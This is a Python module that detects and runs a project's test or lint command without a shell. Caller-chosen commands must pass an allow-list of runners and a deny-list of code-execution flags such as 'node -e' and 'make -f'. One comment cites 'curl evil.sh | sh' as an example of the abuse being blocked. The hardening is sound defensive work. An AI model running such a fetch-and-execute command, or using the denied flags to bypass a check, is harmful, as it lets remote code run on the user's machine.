"""Project checks: decide what "correct" means for a directory, then run it.

The multi-model pipeline is only trustworthy if the last word comes from the
project's own tests, not from a model's opinion of itself.

Commands are never handed to a shell. They are split with ``shlex`` and run as
an argv list, so a command string can never expand into a pipeline, a redirect
or a substitution. A caller that *chooses* the command (rather than letting the
project detect it) must additionally stay inside :data:`ALLOWED_COMMAND_SHAPES`.
"""

from __future__ import annotations

import os
import re
import shlex
import subprocess
from dataclasses import dataclass
from pathlib import Path

from .system import system_binary

MAX_LOG = 12000

# The commands a caller may pick. The list is deliberately small: only
# well-known test and lint runners, so a connected client cannot turn the
# checks into a general-purpose shell ("curl evil.sh | sh").
ALLOWED_COMMAND_SHAPES: tuple[tuple[str, ...], ...] = (
    ("pytest",),
    ("python", "-m", "pytest"),
    ("python3", "-m", "pytest"),
    ("ruff",),
    ("npm", "test"),
    ("node",),
    ("cargo",),
    ("go",),
    ("make",),
    ("just",),
    ("tox",),
    ("nox",),
    ("mvn",),
    ("gradle",),
    ("dotnet",),
    ("swift", "test"),
)

# Flags that turn an allow-listed runner into an arbitrary-code executor
# ("make -f other.mk", "node -e ..."). Refused on the explicit path.
DENIED_FLAGS: dict[str, frozenset[str]] = {
    "make": frozenset({"-f", "--file", "--makefile"}),
    "node": frozenset({"-e", "--eval", "-p", "--print"}),
}


@dataclass(frozen=True)
class CheckResult:
    ok: bool
    log: str

    @property
    def summary(self) -> str:
        return "checks passed" if self.ok else "checks failed"


def python_command(directory: Path) -> str:
    """Prefer the project's venv: the system python usually has no pytest."""
    for candidate in (".venv/bin/python", "venv/bin/python", ".env/bin/python"):
        path = directory / candidate
        if path.is_file():
            return str(path)
    return "python"


def detect_checks(directory: Path) -> list[str]:
    """Best guess at the project's verification command, or [] when unknown."""
    makefile = directory / "Makefile"
    if makefile.is_file():
        try:
            text = makefile.read_text(encoding="utf-8", errors="ignore")
        except OSError:
            text = ""
        if re.search(r"^check:", text, re.MULTILINE):
            return ["make check"]
        if re.search(r"^test:", text, re.MULTILINE):
            return ["make test"]

    if (
        (directory / "pyproject.toml").is_file()
        or (directory / "pytest.ini").is_file()
        or (directory / "setup.py").is_file()
        or (directory / "tests").is_dir()
    ):
        return [f"{python_command(directory)} -m pytest -q"]

    package = directory / "package.json"
    if package.is_file():
        try:
            text = package.read_text(encoding="utf-8", errors="ignore")
        except OSError:
            text = ""
        if '"test"' in text:
            return ["npm test --silent"]

    if (directory / "Cargo.toml").is_file():
        return ["cargo test --quiet"]
    if (directory / "go.mod").is_file():
        return ["go test ./..."]
    # Emerging runtimes and task runners that otherwise report "unknown check"
    # and skip the verify stage of the pipeline entirely.
    if (directory / "bun.lockb").is_file() or (directory / "bun.lock").is_file():
        return ["bun test"]
    if (directory / "deno.json").is_file() or (directory / "deno.jsonc").is_file():
        return ["deno test"]
    if (directory / "justfile").is_file() or (directory / ".justfile").is_file():
        return ["just test"]
    return []


def _program_path(token: str) -> str | None:
    """The executable a token points at, or None when there is none."""
    if os.sep in token or (os.altsep and os.altsep in token):
        path = Path(token).expanduser()
        return str(path) if path.is_file() else None
    return system_binary(token)


def split_command(command: str) -> list[str]:
    """Split a command string into an argv list, without involving a shell."""
    try:
        argv = shlex.split(command)
    except ValueError as exc:  # unbalanced quotes
        raise ValueError(f"could not parse command {command!r}: {exc}") from None
    if not argv:
        raise ValueError(f"empty command: {command!r}")
    if _program_path(argv[0]) is None:
        # shlex splits on whitespace, so a project path with spaces arrives as
        # several tokens. The raw first field is the program when it exists.
        head, _, rest = command.strip().partition(" ")
        if head and _program_path(head) is not None:
            argv = [head, *shlex.split(rest)] if rest.strip() else [head]
    return argv


def command_allowed(command: str) -> bool:
    """True when `command` is an allow-listed test or lint runner."""
    try:
        argv = split_command(command)
    except ValueError:
        return False
    program = Path(argv[0]).name
    # Normalise versioned interpreters (python3.11, python3.15, ...) so a venv
    # whose binary carries a version suffix still matches the allow-list.
    if program.startswith("python3.") and program[8:].isdigit():
        program = "python3"
    elif program.startswith("python") and program[6:].isdigit():
        program = "python"
    denied = DENIED_FLAGS.get(program, frozenset())
    if any(flag in denied for flag in argv[1:]):
        return False
    head = [program, *argv[1:]]
    return any(head[: len(shape)] == list(shape) for shape in ALLOWED_COMMAND_SHAPES)


def allowed_commands(commands: list[str]) -> list[str]:
    """Return the commands that may run, or raise for every rejected one."""
    rejected = [command for command in commands if not command_allowed(command)]
    if rejected:
        raise ValueError(
            "command not allowed: "
            + ", ".join(repr(command) for command in rejected)
            + ". Allowed: pytest, python -m pytest, ruff, npm test, node, cargo, go, "
            "make, just, tox, nox, mvn, gradle, dotnet, swift test."
        )
    return list(commands)


def run_checks(directory: Path, commands: list[str], timeout: float = 900.0) -> CheckResult:
    """Run each command in `directory`; all must pass.

    The commands run without a shell, so none of them can turn into a
    pipeline, a redirect or a substitution. They are the project's own
    commands; a caller that *picks* the command has to go through
    :func:`run_allowed_checks`, which holds them to the allow-list.
    """
    if not commands:
        return CheckResult(True, "no checks detected (use --checks to specify)")

    ok = True
    chunks: list[str] = []
    for command in commands:
        try:
            argv = split_command(command)
        except ValueError as exc:
            ok = False
            chunks.append(f"$ {command}\nERROR: {exc}")
            continue
        try:
            result = subprocess.run(
                argv,
                shell=False,
                cwd=str(directory),
                capture_output=True,
                text=True,
                timeout=timeout,
                check=False,
            )
        except subprocess.TimeoutExpired:
            ok = False
            chunks.append(f"$ {command}\nTIMEOUT after {timeout:.0f}s")
            continue
        except OSError as exc:
            ok = False
            chunks.append(f"$ {command}\nERROR: {exc}")
            continue

        passed = result.returncode == 0
        ok = ok and passed
        body = (result.stdout or "") + (result.stderr or "")
        chunks.append(f"$ {command}  (exit {result.returncode})\n{body.strip()[-MAX_LOG:]}")

    return CheckResult(ok, "\n\n".join(chunks))


def run_allowed_checks(directory: Path, commands: list[str], timeout: float = 900.0) -> CheckResult:
    """Run caller-supplied commands, refusing anything outside the allow-list.

    This is the path for a caller that picks the command itself. The commands
    the project detects are trusted by construction and go through
    :func:`run_checks` directly.
    """
    return run_checks(directory, allowed_commands(commands), timeout=timeout)
